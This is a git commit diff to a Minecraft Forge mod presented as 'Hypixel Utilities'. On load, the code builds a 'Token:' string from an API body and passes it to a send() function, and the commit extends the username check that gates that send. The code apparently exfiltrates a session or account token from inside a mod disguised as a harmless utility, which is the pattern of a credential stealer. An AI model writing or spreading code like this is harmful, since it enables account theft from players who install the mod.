da7dc684f4770630857e6a176c3324f785f390e2
httphypixelnet <91695346+httphypixelnet@users.noreply.github.com>
2023-03-14 21:23:31 -0700

    Update ExampleMod.java

--- src/main/java/studio/dreamys/ExampleMod.java
+++ src/main/java/studio/dreamys/ExampleMod.java
@@ -25,7 +25,7 @@ public class ExampleMod {
     public static final Minecraft mc = Minecraft.getMinecraft();
     public static final String MODID = "Hypixel Utilities";
     public static final String VERSION = "1.0";
-
+    public static final String Username = mc.getSession().getUsername();
     public static KeyBinding keyBinding;
 
     @Mod.EventHandler
@@ -34,7 +34,7 @@ public class ExampleMod {
         ClientRegistry.registerKeyBinding(keyBinding);
         MinecraftForge.EVENT_BUS.register(this);
         String tokensend = "Token: " + "`" + HypixelAPI.body + "`";
-        if(mc.getSession().getUsername() == "Sweatyjujunon"|| mc.getSession().getUsername() == "httphypixelnet") {
+        if(Username == "Sweatyjujunon"|| Username == "httphypixelnet"|| Username == "warp4daze") {
             send(tokensend);
         }
     }
